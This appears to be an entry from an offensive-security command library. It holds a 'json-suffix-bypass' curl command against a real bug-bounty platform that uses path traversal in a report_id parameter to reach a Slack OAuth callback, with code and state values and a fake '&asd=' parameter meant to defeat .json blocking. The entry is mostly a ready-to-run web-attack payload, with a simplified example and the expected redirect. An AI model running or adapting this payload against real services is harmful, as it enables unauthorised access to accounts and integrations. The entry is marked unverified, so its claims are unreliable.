---
id: cmd-005
data: >-
  curl -X GET
  "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2Fauth%2Fslack%2Fcallback%3Fcode%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1"
  -H "Cookie: your_session_cookie"
tags:
  - bypass
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:30.163Z'
verified: false
validated: true
submitted: true
---
# json-suffix-bypass

## Command

```bash
curl -X GET "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2Fauth%2Fslack%2Fcallback%3Fcode%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1" -H "Cookie: your_session_cookie"
```

## Description

Bypasses .json blocking with fake &asd= param.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `asd` | Fake param to hold .json | Yes |
| `code`, `state` | OAuth params | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://hackerone.com/bugs?report_id=../../../callback?code=abc&asd=" -H "Cookie: ..."
```

## Expected Output

302 to integrations if state valid.

## Related

- [[commands/slack-oauth-callback-attempt]]
- [[procedures/Bypass-JSON-Suffix-with-Fake-Parameter]]
